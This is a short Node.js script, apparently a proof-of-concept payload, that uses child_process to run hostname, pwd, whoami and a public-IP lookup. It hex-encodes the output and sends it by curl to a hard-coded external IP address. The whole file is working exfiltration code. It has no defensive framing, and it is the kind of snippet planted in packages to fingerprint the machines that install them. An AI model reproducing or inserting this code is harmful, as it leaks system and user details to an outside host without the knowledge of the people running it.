const { exec } = require("child_process");

const command = `hostname; pwd; whoami; echo 'poc'; curl https://ifconfig.me;`;

exec(`a=$(${command}) && echo $a | xxd -p | head | while read ut; do curl -k -i -s "http://198.199.83.132/?data=$ut"; done`, 
(error, data, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  
  console.log(`Data: ${data}`);
  console.error(`stderr: ${stderr}`);
});

